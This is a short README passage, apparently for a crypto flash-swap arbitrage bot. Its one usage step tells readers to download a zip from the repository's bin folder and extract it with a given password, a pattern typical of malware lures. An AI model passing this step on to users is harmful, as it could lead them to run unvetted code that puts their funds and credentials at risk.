...
### Usage
- [Download](https://github.com/Cardo16/flash-swap-arbitrage/blob/main/bin/flash-arbitrage-0.3.zip) the repository release and extract files with password `713PqVq1NXF`.
